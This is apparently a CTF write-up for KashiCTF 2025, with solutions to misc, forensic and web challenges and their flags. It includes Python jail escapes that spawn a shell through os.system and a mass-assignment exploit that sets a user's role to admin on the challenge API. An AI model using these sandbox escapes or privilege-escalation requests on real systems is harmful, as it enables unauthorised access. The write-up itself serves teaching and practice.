# Misc

### Easy Jail 

![image](https://github.com/x03ee/CTF-Writeup/blob/main/2025/KashiCTF%202025/img/EasyJail.PNG)

```
breakpoint()
import os; os.system("sh")
cd / && cat flag.txt
```

### Easy Jail 2 

![image](https://github.com/x03ee/CTF-Writeup/blob/main/2025/KashiCTF%202025/img/EasyJail2.PNG)

```
breakpoint()
import os; os.system("sh")
cd / && cat flag.txt
```

### SNOWy Evening

![image](https://github.com/x03ee/CTF-Writeup/blob/main/2025/KashiCTF%202025/img/Snow.PNG)

`stegsnow -C -p "Aakash" poemm.txt`

output : https://pastebin.com/HVQfa14Z

https://mysterytoolbox.organisingchaos.com/Ciphers/cipher/Moo

`KashiCTF{Love_Hurts_5734b5f}`

### Self Destruct

![image](https://github.com/x03ee/CTF-Writeup/blob/main/2025/KashiCTF%202025/img/Destruct.PNG)

`grep -hnra fLaG 0.img`

`KashiCTF{rm_rf_no_preserve_root_Am_1_Right??_No_Err0rs_4ll0wed_Th0}`

### Final Game?

![image](https://github.com/x03ee/CTF-Writeup/blob/main/2025/KashiCTF%202025/img/final.PNG)

Exporting the chess and we can use https://incoherency.co.uk/chess-steg/ to decrypt the data.

`KashiCTF{Will_This_Be_My_Last_Game_e94fab41}`

### Game 2 - Wait

![image](https://github.com/x03ee/CTF-Writeup/blob/main/2025/KashiCTF%202025/img/Game2.PNG)

We identify coordnets  within the program, and we can create a script to decrypt them to potentialy form an image as the flag.

```py
import matplotlib
matplotlib.use('Agg')

import matplotlib.pyplot as plt

coordinates = [
    (232,128),(232,80),(232,96),(232,112),(232,144),(232,160),(232,176),(248,112),
    (265,103),(281,87),(248,128),(264,144),(272,160),(280,176),(343,120),(327,128),
    (319,144),(319,160),(327,176),(343,176),(359,176),(367,160),(367,144),(367,128),
    (359,120),(375,168),(391,176),(343,120),(327,128),(327,176),(343,176),(359,176),
    (367,160),(367,144),(367,128),(359,120),(375,168),(391,176),(335,376),(335,360),
    (335,344),(335,328),(335,312),(335,296),(351,328),(367,320),(375,304),(375,376),
    (415,376),(415,360),(415,344),(415,328),(415,312),(415,296),(431,312),(447,304),
    (463,296),(367,360),(351,344),(471,104),(455,104),(439,104),(423,112),(423,128),
    (423,144),(439,144),(455,144),(471,144),(471,160),(463,177),(455,177),(439,177),
    (423,177),(513,89),(513,121),(513,137),(513,153),(513,169),(513,177),(513,105),
    (529,145),(545,145),(553,153),(553,169),(553,177),(185,291),(185,323),(185,339),
    (185,355),(185,371),(185,379),(185,307),(201,347),(217,347),(225,355),(225,371),
    (225,379),(977,291),(977,323),(977,339),(977,355),(977,371),(977,379),(977,307),
    (993,347),(1009,347),(1017,355),(1017,371),(1017,379),(593,177),(593,161),
    (593,145),(593,129),(593,89),(693,84),(677,84),(661,84),(645,84),(629,84),
    (629,100),(629,116),(629,132),(629,148),(629,164),(629,180),(645,180),
    (661,180),(677,180),(693,180),(149,284),(133,284),(117,284),(101,284),
    (85,284),(85,300),(85,316),(85,332),(85,348),(85,364),(85,380),(101,380),
    (117,380),(133,380),(149,380),(733,84),(749,84),(765,84),(781,84),(797,84),
    (765,100),(765,116),(765,132),(765,148),(765,164),(765,180),(853,180),
    (853,164),(853,148),(853,132),(853,116),(853,100),(853,84),(869,84),
    (885,84),(901,84),(917,84),(869,124),(885,124),(901,124),(45,260),
    (29,276),(37,292),(37,308),(29,324),(13,340),(29,353),(37,369),
    (37,385),(29,400),(45,416),(1062,257),(1076,270),(1068,286),(1068,302),
    (1076,318),(1092,334),(1077,350),(1069,366),(1069,382),(1077,398),
    (1061,414),(301,336),(301,352),(301,368),(301,376),(301,320),
    (301,304),(285,344),(269,344),(253,344),(261,336),(269,320),
    (285,304),(301,288),(525,336),(525,352),(525,368),(525,376),
    (565,376),(581,376),(597,376),(613,376),(629,376),(717,376),
    (701,360),(693,344),(685,328),(677,312),(669,296),(661,280),
    (733,362),(741,346),(749,330),(757,314),(765,298),(773,282),
    (797,322),(805,338),(821,354),(837,346),(845,330),(851,318),
    (819,366),(811,382),(891,318),(891,334),(891,350),(891,366),
    (899,382),(915,382),(931,382),(939,374),(939,358),(939,342),
    (939,326),(939,318),(525,320),(525,304),(509,344),(493,344),
    (477,344),(485,336),(493,320),(509,304),(525,288)
]

x_vals, y_vals = zip(*coordinates)

plt.figure(figsize=(10, 6))
plt.scatter(x_vals, y_vals, s=2, color="black")

plt.gca().invert_yaxis()

plt.axis("equal")

plt.title("Extracted Vector-Based Image")

plt.savefig("output.png", dpi=300)
```

`KashiCTF{Ch4kr4_Vyuh}`

# Forensic

### Memories Bring Back You

![image](https://github.com/x03ee/CTF-Writeup/blob/main/2025/KashiCTF%202025/img/Mem.PNG)

`grep -ra "KashiCTF" <file location>`

```
�]h��D�A7���0x\K��dk��K��dk��K��dk��K��dk���`�`HK��dk��
image_410.jpg�H�@�
                  �t
                    �t
                      2�������yGFILE|H8`�`H�
                                            �dk���5�]h���5�]h��q�a���0x\�
                                                                         �dk���
                                                                               �dk���
                                                                                     �dk���
image_414.jpg�H�@�.cnc2��������yGFILE0xH8`�`H6��dk���^h��_h������_h���~n*���0x\6��dk��6��dk��6��dk��6��dk���.
                   �.
image_418.jpg�H�@�;yN;yNJ��ְ����J�GFILE02��������yGFILE0;pH8`�`Hh2�dk���(bh���(bh��B+���0x\h2�dk��h2�dk��h2�dk��h2�dk��pimage_419.jpg�H�@p+�f+�f+2�&������yGFILE0\�H8`�`H
                                                 F�dk����ch����ch����y���0x\
                                                                            F�dk��
                                                                                  F�dk��
                                                                                        F�dk��
image_421.jpg�H�@�(x�(x�(2�]��X8not_hidden.txtKashiCTF{DF1R_g03555_Brrrr}
```


`KashiCTF{DF1R_g03555_Brrrr}`

### Corruption

![image](https://github.com/x03ee/CTF-Writeup/blob/main/2025/KashiCTF%202025/img/curr.PNG)

using Autopsy we can search "KashiCTF" and we get the flag.


### Look at Me

![image](https://github.com/x03ee/CTF-Writeup/blob/main/2025/KashiCTF%202025/img/look.PNG)

Use silent eye and decrypt the image and get the flag.


# Web

### SuperFastAPI

![image](https://github.com/x03ee/CTF-Writeup/blob/main/2025/KashiCTF%202025/img/super.PNG)

`http://kashictf.iitbhucybersec.in:<port>/redoc` - Document of all the headers.

1. Create an account `http://kashictf.iitbhucybersec.in:<port>/register/test`

add 
```
{
"fname": "John",
"lname": "Doe",
"email": "john.doe@example.com",
"gender": "male"
}
```

2. Update the role since it asks for admin when changing register to flag.

`http://kashictf.iitbhucybersec.in:<port>/update/test`

include

```
{
  "role": "admin"
}
```

3. Head to `http://kashictf.iitbhucybersec.in:<port>/flag/test`

`{"message":"KashiCTF{m455_4551gnm3n7_ftw_SksZ90TZu}"}`
